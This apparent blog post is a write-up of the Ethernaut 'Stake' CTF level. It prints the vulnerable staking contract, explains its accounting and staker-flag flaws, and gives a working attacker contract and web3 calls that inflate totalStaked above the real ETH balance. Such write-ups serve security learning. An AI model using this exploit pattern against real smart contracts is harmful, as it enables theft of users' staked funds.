---
layout: post
title: "Ethernaut CTF WriteUp Stake 31 "
date: 2024-06-01 13:07:12
categories: blog
---

Ethernaut latest Challenge

<!--more-->

## 31 Stake
Chall description: 

Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?

To complete this level, the contract state must meet the following conditions:

- The Stake contract's ETH balance has to be greater than 0.
- totalStaked must be greater than the Stake contract's ETH balance.
- You must be a staker.
- Your staked balance must be 0.


Stake Contract : 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

To Solve this challenge we need to meet the 4 conditions above.

At first glance of the Contract in Unstake function missing the `Stakers[msg.sender] = false`, So we can stake and unstake our ETH and still remains as a Staker.
This satisfies the 3,4 conditions but what about the first 2 ?

- For that, Initially UserB stakes `0.001 ether` using `StakeETH()` function.

Contract state :  
```
totalStaked = 0.001 ether
UserStake[userB] = 0.001 ether;
```
- Again UserB stakes `0.001 ether` using `StakeWETH()` function. To do this userB should create a WETH token instance with msg.value 0.001 ether(which calls depoist function in WETH token contract).

Contract state :  
```
totalStaked = 0.002 ether
UserStake[userB] = 0.002 ether;
```
- The Unstake function only sending ETH from contract not the WETH 
`(bool success, ) = payable(msg.sender).call{value : amount}("");` 
- Now call the Unstake function with ether less than 0.001 ether (assume it as X). Which leaves some ether on the contract balance. 

Contract state :
```
totalStaked = 0.001 ether + (0.001 - X) 
UserStake[userB] = 0.001 ether + (0.001 - X) 
Contracts Balace = 0.001 - X ( which is greater than 0) 

```
userB contract : 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IWETH.sol";
import "./Stake.sol";

contract userB {
    IWETH public weth;
    

    constructor(address _weth) payable  {
        weth = IWETH(_weth);
    }

    function stakeUserB() public payable {
        Stake stake = Stake(//stake instance);
        uint256 amount = 10000000000000000 wei;
        stake.StakeETH{value: amount}();
        weth.approve(address(stake), amount);
        stake.StakeWETH(amount);
        stake.Unstake(amount - 10);
    }

    receive() external payable {
        (bool success) = payable(//player address).send(address(this).balance - 1);
        require(success);
    }

}
```

- From the player account call StakeETH() and UnStakeETH() with 0.001 ether.

```js
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: web3.eth.abi.encodeFunctionSignature('StakeETH()'),
  value: 10000000000000000
});

await contract.Unstake(10000000000000000);
```

Contract State After this : 
```
totalStaked = 0.001 ether + (0.001 - X) 
UserStake[userB] = 0.001 ether + (0.001 - X) 
Contracts Balace = 0.001 - X ( which is greater than 0)
Staker[player] = true
UserStake[player] = 0
```

All 4 conditions are satisfied .
```
Congratulations, you have cracked the Stake machine!

```
